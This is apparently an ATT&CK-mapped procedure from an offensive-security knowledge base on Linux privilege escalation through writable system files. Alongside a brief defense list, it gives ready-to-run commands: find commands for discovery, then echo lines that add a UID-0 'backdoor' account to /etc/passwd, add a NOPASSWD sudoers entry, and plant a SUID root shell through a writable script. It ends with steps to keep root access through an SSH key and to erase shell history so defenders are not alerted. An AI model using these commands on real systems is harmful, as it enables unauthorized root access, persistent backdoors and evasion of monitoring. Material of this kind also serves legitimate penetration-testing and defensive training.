---
id: 73ad0400-d09b-4fc6-8012-b52620b6956a
type: procedure
name: Linux-Privilege-Escalation-via-Writable-Files
description: >-
  Identify and exploit writable system files to escalate privileges on a Linux
  target.
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.149856+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/Linux]]'
  - '[[tags/Privilege Escalation]]'
  - '[[tags/Writable Files]]'
commands:
  - '[[commands/find-writable-files-not-owned-by-user]]'
  - '[[commands/find-world-writable-files]]'
  - '[[commands/find-world-writable-non-proc-files]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-Writable-Files

## Summary

This procedure demonstrates how to identify writable files on a Linux system that can be leveraged for privilege escalation. By locating files owned by root or other privileged users that are writable by low-privileged accounts, an attacker can modify critical system files like /etc/passwd, /etc/shadow, or /etc/sudoers to create backdoor accounts, inject malicious code, or grant elevated access. This technique is commonly used in post-exploitation scenarios to achieve root privileges from an initial low-privilege shell.

## Description

Writable files escalation exploits misconfigurations in file permissions where sensitive system files can be altered by non-privileged users. Common targets include user databases (/etc/passwd for adding users), authorization files (/etc/sudoers for nopasswd entries), or startup scripts (/etc/crontab for persistence). The process begins with discovery of such files using system tools like 'find', followed by targeted modifications to inject escalatory changes. This is effective on misconfigured servers but requires careful validation to avoid detection through file integrity monitoring. The procedure assumes a low-privilege shell and focuses on safe, verifiable steps to prevent system disruption.

## Requirements

1. Low-privilege shell access to the target Linux system (e.g., via SSH or reverse shell).
2. Basic knowledge of Linux file permissions and common system files.
3. No additional tools required; uses built-in 'find' and 'ls' commands.
4. Target system with potential misconfigurations (e.g., world-writable sensitive files).

## Defense

- Enforce strict file permissions using umask and chmod to prevent unauthorized writes to system directories like /etc.
- Implement file integrity monitoring (FIM) tools like AIDE or Tripwire to detect modifications to critical files.
- Use mandatory access controls (e.g., SELinux or AppArmor) to restrict write operations even if permissions allow them.
- Regularly audit permissions with tools like Lynis and monitor logs for suspicious 'find' or file write activity via auditd.

## Objectives

1. Discover writable system files that can be exploited for privilege escalation.
2. Modify identified files to create elevated access, such as adding a root-equivalent user.
3. Verify successful escalation and establish persistence if needed.

## Instructions

### Step 1: Identify Writable Files Not Owned by Current User

**Context**: This step locates files writable by your user but owned by others (e.g., root), excluding volatile directories like /proc and /sys to focus on persistent system files. These are prime candidates for modification.

**Command** ([[commands/find-writable-files-not-owned-by-user]]):
```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
```

> This command searches from root, filters for writable regular files not owned by you, executes 'ls -al' for details, and suppresses errors. Review the output for files like /etc/passwd or /etc/group. If /etc/passwd appears, it indicates a severe misconfiguration allowing user addition.

### Step 2: Locate World-Writable Files

**Context**: World-writable files (permissions allowing any user to write) are high-risk for escalation, as they can be directly edited without ownership checks. This helps identify broadly exploitable files.

**Command** ([[commands/find-world-writable-files]]):
```bash
find / -perm -2 -type f 2>/dev/null
```

> The '-perm -2' flag targets files with world-write permission (octal 002). Output lists paths like /tmp or misconfigured logs. Cross-reference with Step 1 for privileged ownership.

### Step 3: Find World-Writable Files Excluding /proc

**Context**: Similar to Step 2 but excludes /proc to avoid false positives from dynamic process data, providing a cleaner list for analysis.

**Command** ([[commands/find-world-writable-non-proc-files]]):
```bash
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

> This prints paths of world-writable files outside /proc. Use this to spot targets like writable cron jobs or config files.

### Step 4: Analyze and Exploit Identified Files

**Context**: Review outputs from previous steps for exploitable files. Common escalations include adding users to /etc/passwd (if writable) or appending to /etc/sudoers.

**Instructions**: 
- If /etc/passwd is writable: Echo a new user entry, e.g., `echo 'backdoor:x:0:0:Backdoor:/root:/bin/bash' >> /etc/passwd`. Then `su backdoor` to gain root.
- If /etc/sudoers is writable: Append `youruser ALL=(ALL) NOPASSWD:ALL` and use `sudo -i`.
- For writable scripts (e.g., /usr/local/bin/startup.sh): Inject `echo 'cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh' >> script` and wait for execution.
- Verify with `id` or `whoami` post-modification.

> Always backup originals (e.g., `cp /etc/passwd /etc/passwd.bak`) and test in a lab to avoid locking out legitimate access.

### Step 5: Verify Escalation and Clean Up

**Context**: Confirm privilege gain and remove traces to maintain access without alerting defenders.

**Instructions**: Run `id` to check UID=0. If successful, establish persistence (e.g., add SSH key to /root/.ssh). Revert changes: `cp /etc/passwd.bak /etc/passwd` and clear history with `history -c`.

> Success is indicated by root shell access; failure may require combining with other techniques like SUID binaries.
